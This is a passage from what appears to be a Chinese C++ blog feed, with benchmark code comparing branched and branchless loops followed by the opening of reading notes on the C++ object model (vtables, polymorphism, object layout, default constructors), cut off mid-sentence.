class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_branched</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">c1</span><span class="hljs-params">(N)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>        c1[i] = rand() &amp; <span class="hljs-number">0x1</span>;<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">int</span>* b1 = c1.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> 0</span><br>            (b1[i] ? a1 : a2) += p1[i];<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>            <span class="hljs-keyword">if</span> (b1[i]) &#123;<br>                a1 += p1[i];<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                a2 += p1[i];<br>            &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">// 1</span></span><br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用数组，消除分支，通过索引在不同的内存单元进行计算。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_branchless</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">c1</span><span class="hljs-params">(N)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>        c1[i] = rand() &amp; <span class="hljs-number">0x1</span>;<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">int</span>* b1 = c1.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* a[<span class="hljs-number">2</span>] = &#123; &amp;a2, &amp;a1 &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            a[b1[i]] += p1[i];<br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>(b1[i] ? a1 : a2)在某些编译器中，会使用查找数组的方式优化，也就是上面的方式。所以，比使用条件分支代码更高效。</p></blockquote><h4><span id="例二">例二</span></h4><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_branched1</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">c1</span><span class="hljs-params">(N)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>        c1[i] = rand() &amp; <span class="hljs-number">0x1</span>;<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">int</span>* b1 = c1.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (b1[i]) &#123;<br>                a1 += p1[i];<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                a2 += p2[i];<br>            &#125;<br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用两个中间值数组，进行分支消除。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_branchless1</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">c1</span><span class="hljs-params">(N)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>        c1[i] = rand() &amp; <span class="hljs-number">0x1</span>;<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">int</span>* b1 = c1.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s1[<span class="hljs-number">2</span>] = &#123;     <span class="hljs-number">0</span>, p1[i] &#125;;<br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s2[<span class="hljs-number">2</span>] = &#123; p2[i],     <span class="hljs-number">0</span> &#125;;<br>            a1 += s1[b1[i]];<br>            a2 += s2[b1[i]];<br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h4><span id="例三">例三</span></h4><p>基于随机值条件分支的版本，处理器不能对其进行高效正确率高的分支预测。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_branched2</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">c1</span><span class="hljs-params">(N)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>        c1[i] = rand() &amp; <span class="hljs-number">0x1</span>;<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">int</span>* b1 = c1.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (b1[i]) &#123;<br>                a1 += p1[i] - p2[i];<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                a2 += p1[i] * p2[i];<br>            &#125;<br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>基于bool值条件分支的版本，处理器可以进行高效正确率高的分支预测，程序会被处理器优化执行，实测性能与无分支版本相当，甚至更好。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_branched2_predicted</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">c1</span><span class="hljs-params">(N)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>        c1[i] = rand() &gt; <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">int</span>* b1 = c1.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (b1[i]) &#123;<br>                a1 += p1[i] - p2[i];<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                a2 += p1[i] * p2[i];<br>            &#125;<br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>无分支版本：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_branchless2</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">c1</span><span class="hljs-params">(N)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>        c1[i] = rand() &amp; <span class="hljs-number">0x1</span>;<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">int</span>* b1 = c1.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s1[<span class="hljs-number">2</span>] = &#123;             <span class="hljs-number">0</span>, p1[i] - p2[i] &#125;;<br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s2[<span class="hljs-number">2</span>] = &#123; p1[i] * p2[i],             <span class="hljs-number">0</span> &#125;;<br>            a1 += s1[b1[i]];<br>            a2 += s2[b1[i]];<br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_branchless2a</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">c1</span><span class="hljs-params">(N)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>        c1[i] = rand() &amp; <span class="hljs-number">0x1</span>;<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">int</span>* b1 = c1.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* a[<span class="hljs-number">2</span>] = &#123; &amp;a2, &amp;a1 &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s[<span class="hljs-number">2</span>] = &#123; p1[i] * p2[i], p1[i] - p2[i] &#125;;<br>            a[b1[i]] += s[b1[i]];<br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> Optimize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入C++对象模型笔记</title>
      <link href="/posts/ae73e7a0.html"/>
      <url>/posts/ae73e7a0.html</url>
      
        <content type="html"><![CDATA[<h2><span id="一-关于对象">一、关于对象</span></h2><h3><span id="10加上封装后的布局成本layout-costs-for-addingencapsulation"><strong>1.0加上封装后的布局成本</strong>（Layout Costs for AddingEncapsulation）</span></h3><p>C++在布局以及存取时间上主要的额外负担是由virtual引起的:</p><ul><li>virtual function 机制用以支持一个有效率的“执行期绑定”（runtimebinding）。</li><li>virtual base class 用以实现“多次出现在继承体系中的baseclass，有一个<strong>单一而被共享</strong>的实例（ios）。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/20/00-01-34-6550e7.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><h3><span id="11-c对象模型"><strong>1.1 C++对象模型</strong></span></h3><p>在C++中，有两种class data members：static和nonstatic，以及三种classmember functions：static、nonstatic和virtual。</p><p>在C++对象模型中，Nonstatic data members在每一个classobject之内，static data members则被存放在class object之外。</p><p>Static和nonstatic function members被放在class object之外。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/19/23-59-29-784051.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><p>Virtual functions：</p><ol type="1"><li>每一个 class 产生出一堆指向virtualfunctions的指针，放在表格之中。这个表格被称为 virtualtable（vtbl）。</li><li>每一个class object 被安插一个指针，指向相关的virtualtable。通常这个指针被称为vptr。vptr的设定（setting）和重置（resetting）都由每一个class的constructor、destructor和copyassignment运算符自动完成。每一个 class所关联的 type_infoobject（用以支持runtime type identification，RTTI）也经由virtualtable被指出来，通常放在表格的第一个slot（地址空间）。</li></ol><h3><span id="12-关键词所带来的差异"><strong>1.2 关键词所带来的差异</strong></span></h3><p>C struct在C++中的一个合理用途，是当你要传递“一个复杂的classobject的全部或部分”到某个C函数去时，struct声明可以将数据封装起来，并保证拥有与C兼容的空间布局。</p><p>然而这项保证只在组合（composition）的情况下才存在。如果是“继承”而不是“组合”，编译器会决定是否应该有额外的datamembers被安插到base struct subobject之中。</p><h3><span id="13-对象的差异"><strong>1.3 对象的差异</strong></span></h3><p>C++程序设计模型直接支持三种programmingparadigms（程序设计范式）：</p><ol type="1"><li>程序模型（procedural model）。就像 C一样，C++当然也支持它。</li><li>抽象数据类型模型（abstract data typemodel，ADT）。此模型所谓的“抽象”是和一组表达式（public接口）一起提供的，实际仍然未定义。</li><li>面向对象模型（object-orientedmodel）。在此模型中有一些彼此相关的类型，通过一个抽象的 baseclass（用以提供共同接口）被封装起来。</li></ol><p><strong>只有通过pointer或reference</strong>间接处理对象，才能支持<strong>多态</strong>性质。</p><blockquote><p>C++以下列方法支持多态：</p><ol type="1"><li>经由一组隐式的转化操作。例如把一个 derived class指针转化为一个指向其 public base type的指针。</li><li>经由 virtual function 机制。</li><li>经由 dynamic_cast 和 typeid 运算符。</li></ol></blockquote><p>多态的主要用途是经由一个共同的接口来影响类型的封装，这个接口通常被定义在一个抽象的baseclass中。</p><p>需要多少内存才能够表现一个class object？一般而言要有：</p><ul><li><p>其 nonstatic data members的总和大小。</p></li><li><p>加上任何由于 alignment 的需求而填补（padding）上去的空间。</p><blockquote><p>alignment就是将数值调整到某数的倍数。在32位计算机上，通常alignment为4bytes（32位），以使bus的“运输量”达到最高效率。</p></blockquote></li><li><p>加上为了支持 virtual而由内部产生的任何额外负担（overhead）。</p></li></ul><p>“指向不同类型之各指针”间的差异，既不在其指针表示法不同，也不在其内容（代表一个地址）不同，而是在其所寻址出来的object类型不同。</p><p>也就是说，“指针类型”会教导编译器如何解释某个特定地址中的内存内容及其大小。</p><p>转换（cast）其实是一种编译器指令。大部分情况下它并不改变一个指针所含的真正地址，它只影响“被指出之内存的大小和其内容”的解释方式。</p><p>总而言之，多态是一种威力强大的设计机制，允许你继承一个抽象的public接口之后，封装相关的类型。需要付出的代价就是额外的间接性——不论是在“内存的获得”或是在“类型的决断”上。C++通过class的pointers和references来支持多态，这种程序设计风格就称为“面向对象”。</p><p>C++也支持具体的ADT程序风格，如今被称为object-based（OB）。例如Stringclass，一种非多态的数据类型。Stringclass可以展示封装的非多态形式；它提供一个public接口和一个private实现，包括数据和算法，但是不支持类型的扩充。如今的Go，Rust 都是走OB的路线。</p><p>一个OB设计可能比一个对等的OO设计速度更快而且空间更紧凑。速度快是因为所有的函数调用操作都在编译时期解析完成，对象建构起来时不需要设置virtual 机制；空间紧凑则是因为每一个 class object不需要负担传统上为了支持virtual机制而需要的额外负荷。不过，OB设计比较没有弹性。</p><h2><span id="二-构造函数语意学">二、构造函数语意学</span></h2><blockquote><ul><li>implicit：暗中的、隐式的（在程序源代码中没有出现）</li><li>explicit：显式的（程序源代码中出现）</li><li>trivial：没有用的</li><li>nontrivial：有用的</li><li>memberwise：对每一个member施以……</li><li>bitwise：对每一个bit施以……</li><li>semantics：语意</li></ul></blockquote><h3><span id="21-defaultconstructor的构造操作"><strong>2.1 DefaultConstructor的构造操作</strong></span></h3><p>C++新手一般有两个常见的误解：</p><ol type="1"><li>任何class如果没有定义default constructor，就会被合成出一个来。</li><li>编译器合成出来的default constructor会显式设定“class 内每一个 datamember的默认值”。</li></ol><p>有4种情况，会造成“编译器必须为未声明 constructor的classes合成一个default constructor”。C++Standard 把那些合成物称为implicit nontrivial default constructors。</p><ol type="1"><li>“带有 Default Constructor”的 Member Class Object</li></ol><blockquote><p>如果一个class没有任何constructor，但它内含一个memberobject，而后者有default constructor，那么这个class的 implicit defaultconstructor就是“nontrivial”，编译器需要为该class 合成出一个defaultconstructor。不过这个合成操作只有在constructor真正需要被调用时才会发生。再一次请你注意，被合成的defaultconstructor只满足编译器的需要，而不是程序的需要。</p><p>如果对象的成员没有定义默认构造函数，那么编译器合成的默认构造函数将不会为之提供初始化。例如类A包含两个数据成员对象，分别为：<code>string str</code>和<code>char* 